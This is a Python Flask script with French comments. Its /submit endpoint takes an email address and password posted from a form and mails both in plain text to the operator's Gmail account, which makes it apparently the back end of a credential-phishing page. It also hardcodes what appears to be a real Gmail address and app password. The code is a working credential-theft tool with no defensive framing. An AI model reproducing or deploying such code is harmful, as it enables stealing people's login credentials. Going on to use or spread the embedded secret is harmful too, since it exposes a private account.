from flask import Flask, request
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# ➤ Remplace ces infos avec les tiennes
YOUR_EMAIL = "maxelieachache@gmail.com"  # ← Mets ici ton adresse Gmail
YOUR_PASSWORD = "ajfh yysg xrrv uyox"  # ← Mets ici ton mot de passe Gmail ou un mot de passe d'application

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    email = data.get('email')
    password = data.get('password')

    # Construire le message
    message = MIMEText(f"Email : {email}\nMot de passe : {password}")
    message['Subject'] = "Nouveau formulaire rempli"
    message['From'] = YOUR_EMAIL
    message['To'] = YOUR_EMAIL

    # Envoyer le mail via SMTP (Gmail)
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(YOUR_EMAIL, YOUR_PASSWORD)
            server.send_message(message)
        return {"status": "Email envoyé avec succès"}, 200
    except Exception as e:
        return {"error": str(e)}, 500

if __name__ == '__main__':
    app.run(debug=True)
